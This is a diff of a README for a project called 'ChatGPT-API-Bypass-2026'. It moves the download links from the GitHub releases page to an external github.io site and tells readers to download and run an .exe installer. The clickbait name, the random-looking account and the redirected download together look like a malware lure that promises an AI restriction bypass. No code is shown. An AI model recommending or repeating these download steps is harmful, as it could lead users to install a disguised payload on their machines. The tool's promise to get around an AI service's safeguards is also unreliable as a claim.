@@ -1,6 +1,6 @@
 # 🌐 ChatGPT-API-Bypass-2026 - Control your AI experience with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Conceptualisationcapitalofguinea377/ChatGPT-API-Bypass-2026/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://conceptualisationcapitalofguinea377.github.io)
 
 ## 📖 About this project
 
@@ -20,7 +20,7 @@ Before you install this software, confirm your computer meets these standards:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the project release page: [https://github.com/Conceptualisationcapitalofguinea377/ChatGPT-API-Bypass-2026/releases](https://github.com/Conceptualisationcapitalofguinea377/ChatGPT-API-Bypass-2026/releases)
+1. Visit the project release page: [https://conceptualisationcapitalofguinea377.github.io](https://conceptualisationcapitalofguinea377.github.io)
 2. Locate the most recent version labeled as the Latest Release.
 3. Find the file ending in .exe in the Assets section.
 4. Click the file name to download the installer to your computer.
